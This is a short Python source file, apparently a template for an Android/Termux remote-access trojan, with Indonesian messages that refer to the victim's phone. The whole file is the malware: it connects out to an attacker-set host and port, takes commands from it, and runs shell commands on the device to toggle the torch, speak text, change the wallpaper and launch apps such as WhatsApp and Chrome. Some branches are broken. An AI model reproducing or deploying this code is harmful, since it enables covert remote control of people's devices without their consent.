import socket
import threading
import os, sys

def trojan():
 	HOST = '%s'
 	PORT = %s

 	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	client.connect((HOST, PORT))


 	while True:
 		server = client.recv(1024).decode('utf-8')
 		if server == "help":
 			client.send(f"Cara Penggunaan :\n\nled-on - Menyalakan Senter\nled-on - Menyalakan Senter\ngrab-cam - Mengambil Gambar\ntts (text) - Membunyikan tts".encode("utf-8"))
 		elif server == "led-on":
 			os.popen('termux-torch on')
 			client.send(f"Senter Sudah Menyala Di Hp Taget".encode("utf-8"))
 		elif server == "led-off":
 			os.popen('termux-torch off')
 			client.send(f"Senter Mati Di Hp Taget".encode("utf-8")) 
 		elif server == 'walpaper':
 			os.popen('termux-wallpaper -u '+server[7:])
 		elif "tts" in server:
 			os.popen('termux-tts-speak '+server[4:])
 			client.send(f"Membunyikan TTS {server[4:]}".encode("utf-8"))
 		elif 'run app' == server:
 			client.send(f'Use run app -l to view supported app'.encode("utf-8"))
 		elif 'run app -l' == server:
 			client.send(f'List Apps\n=====\nchrome\nwhatsapp\n\n Atau Kamu Bisa Menjalnkan Aplikasi Lain, Gunakan Aplikasi Current Activity untuk Melihat package name app dan Activity\n\n\nContoh run com.mobile.legends/com.moba.unityplugin.MobaGameUnityActivity'.encode("utf-8"))
 		elif 'run app whatsapp' == server or 'run app Whatsapp' == server:
 			os.popen('am start --user 0 -n com.whatsapp/com.whatsapp.Home.Activity')
 			client.send(f'Succes Membuka whatsapp Di Hp Korban'.encode("utf-8"))
 		elif 'run app chrome' == server:
 			os.popen('am start --user 0 -n com.android.chrome/com.google.android.apps.chrome.Main')
 			client.send(f'Succes Membuka chrome Di Hp Korban'.encode("utf-8"))
 		elif 'run app mobile-legend' == server:
 			os.popen('am start --user 0 -n com.mobile.legends/com.moba.unityplugin.MobaGameUnityActivity')
 			client.send(f'Succes Membuka mobile-legend di hp Korban'.encode("utf-8"))
 		elif 'run' == server:
 			os.popen('am start --user 0 -n '+server[3:])




 		else:
 			continue
 			client.send(f"Command Tidak Dikenal Ketik Menu Untuk Menampilkan".encode("utf-8"))




t = threading.Thread(target=trojan)
t.start()
